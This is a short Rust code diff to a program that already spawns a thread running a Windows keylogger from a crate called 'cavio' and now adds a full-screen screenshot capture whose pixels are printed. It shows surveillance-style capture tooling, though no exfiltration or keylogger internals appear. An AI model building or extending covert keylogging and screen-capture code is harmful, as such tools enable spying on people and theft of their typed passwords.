@@ -1,4 +1,5 @@
 use cavio::cap::keylog::run_keylogger;
+use cavio::cap::screenshot::capture;
 use cavio::helpers::get_copyright;
 use cavio::test;
 
@@ -12,5 +13,8 @@ fn main() {
     std::thread::spawn(|| {
         run_keylogger(&cavio::cap::keylog::WinKeylogger{});
     });
+
+    let image = capture(0,0,0,1920,1080);
+    println!("{:?}", image.pixels);
 
 }
